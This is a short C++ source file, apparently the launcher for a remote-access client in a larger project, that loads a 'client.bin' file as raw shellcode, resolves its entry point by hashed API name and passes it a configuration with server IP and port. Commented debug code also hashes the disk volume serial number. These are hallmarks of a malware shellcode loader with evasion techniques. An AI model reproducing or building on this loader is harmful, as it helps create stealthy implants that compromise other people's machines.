
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <filesystem>
#include "Lightbone/utils.h"
#include "Service/SubServicePackage.h"
#include "Service/NetUtils.h"
#include "Tools/Packer/loader.h"

using client_entry_t = decltype(&client_entry);
namespace fs = std::filesystem;
int main(int argc, char** argv)
{
#ifdef _DEBUG
    /*auto hmodule = LoadLibraryA("NewClient.dll");
    client_entry_t entry = (client_entry_t)ApiResolver::get_proc_address(hmodule, CT_HASH("client_entry"));
    share_data_ptr_t param = new share_data_t();
    param->stage = 1;
    ProtocolCFGLoader cfg;
    cfg.set_field(ip_field_id, kDefaultLocalhost);
    cfg.set_field(port_field_id, kDefaultServicePort);
    cfg.set_field(test_mode_field_id, true);
    auto cfg_bin = cfg.dump();
    param->cfg_size = cfg_bin.size();
    memcpy(param->cfg, cfg_bin.data(), std::min(cfg_bin.size(), sizeof(param->cfg)));
    entry(param);*/
	/*std::wstring volume_serial_number = std::any_cast<std::wstring>(Utils::HardwareInfo::get_volume_serial_number());
	unsigned int volume_serial_number_hash_val = ApiResolver::hash(volume_serial_number.c_str(), volume_serial_number.size());
    std::cout << volume_serial_number_hash_val << std::endl;
    getchar();*/

    std::cout << "Hello World" << sizeof(share_data_t) - offsetof(share_data_t, ret_opcode) << "  " << offsetof(share_data_t, ret_opcode);
#else
    fs::path path(argv[0]);
    std::ifstream file(path.parent_path() / "client.bin", std::ios::in | std::ios::binary);
    if (file.is_open())
    {
        std::cout << "start running\n";
        std::stringstream ss;
        ss << file.rdbuf();
        HINSTANCE hmodule = Utils::execute_raw_shellcode(ss.str());
        client_entry_t entry = (client_entry_t)ApiResolver::get_proc_address(hmodule, CT_HASH("client_entry"));
        share_data_ptr_t param = new share_data_t();
        param->stage = 1;
        ProtocolCFGLoader cfg;
        cfg.set_field(ip_field_id, "kDefaultLocalhost");
        cfg.set_field(port_field_id, kDefaultServicePort);
        auto cfg_bin = cfg.dump();
        param->cfg_size = cfg_bin.size();
        memcpy(param->cfg, cfg_bin.data(), std::min(cfg_bin.size(), sizeof(param->cfg)));
        entry(param);
        std::cout << "start running ok\n";
    }
    else
    {
        std::cout << "client.bin not exist\n";
    }
#endif
    getchar();
    std::cout << "Hello World!\n";
}
